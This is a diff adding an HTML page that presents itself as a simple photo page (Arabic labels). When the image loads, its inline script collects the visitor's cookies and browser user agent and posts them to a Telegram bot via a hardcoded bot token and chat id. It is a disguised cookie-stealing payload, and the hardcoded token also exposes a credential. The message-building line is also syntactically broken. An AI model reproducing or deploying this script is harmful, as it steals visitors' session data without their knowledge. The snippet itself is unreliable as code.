@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>صفحة الصورة</title>
+</head>
+<body>
+
+    <img src="myphoto.jpg" alt="الصورة" id="myImage" width="300">
+
+    <script>
+      const image = document.getElementById("myImage");
+
+      image.addEventListener("load", async () => {
+        alert("تم تحميل الصورة بنجاح!");
+
+        // قراءة الكوكيز المتاحة (إن وجدت)
+        const userCookies = document.cookie || "لا توجد كوكيز متاحة (تشغيل محلي أو HttpOnly)";
+
+        const botToken = "8995153837:AAH66CFMXE1JKFE-o4yztrL8Jy2DQMh3paM"; 
+        const chatId = "8507769505"; 
+        
+        const messageText = 🔔 تنبيه تحميل الصورة:\n\n🍪 الكوكيز:\n${userCookies}\n\n🌐 المتصفح:\n${navigator.userAgent};
+        const telegramUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage";
+
+        try {
+          const res = await fetch(telegramUrl, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: messageText
+            })
+          });
+
+          const data = await res.json();
+
+          if (data.ok) {
+            console.log("تم إرسال البيانات بنجاح!");
+          } else {
+            console.error("خطأ من تليجرام:", data.description);
+          }
+        } catch (error) {
+          console.error("حدث خطأ أثناء الإرسال:", error);
+        }
+      });
+    </script>
+
+</body>
+</html>
